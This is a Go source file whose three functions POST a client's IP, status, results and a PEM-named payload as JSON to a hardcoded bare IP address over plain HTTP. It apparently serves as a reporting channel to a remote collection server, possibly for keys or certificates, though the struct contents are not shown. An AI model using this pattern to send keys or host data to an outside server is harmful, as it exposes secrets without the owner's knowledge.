package command

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

var rootAPI = "http://47.251.32.88:9090"

func reportStatus(s string, statType string) error {
	url := fmt.Sprintf("%s%s", rootAPI, "/public/stat")
	method := "POST"

	stat := StatuePunk{
		IP:     ClientIP,
		Statue: s,
		Type:   statType,
	}

	data, err := json.Marshal(stat)
	if err != nil {
		return err
	}
	payload := strings.NewReader(string(data))

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
		return err
	}
	req.Header.Add("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return err
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return err
	}
	fmt.Println(string(body))

	return nil
}

func reportResult(punk ResultPunk) error {
	url := fmt.Sprintf("%s%s", rootAPI, "/public/ret")
	method := "POST"

	data, err := json.Marshal(punk)
	if err != nil {
		return err
	}
	payload := strings.NewReader(string(data))

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
		return err
	}
	req.Header.Add("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return err
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return err
	}
	fmt.Println(string(body))

	return nil
}

func reportPem(punk PemPunk) error {
	url := fmt.Sprintf("%s%s", rootAPI, "/public/pem")
	method := "POST"

	data, err := json.Marshal(punk)
	if err != nil {
		return err
	}
	payload := strings.NewReader(string(data))

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
		return err
	}
	req.Header.Add("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return err
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return err
	}
	fmt.Println(string(body))

	return nil
}
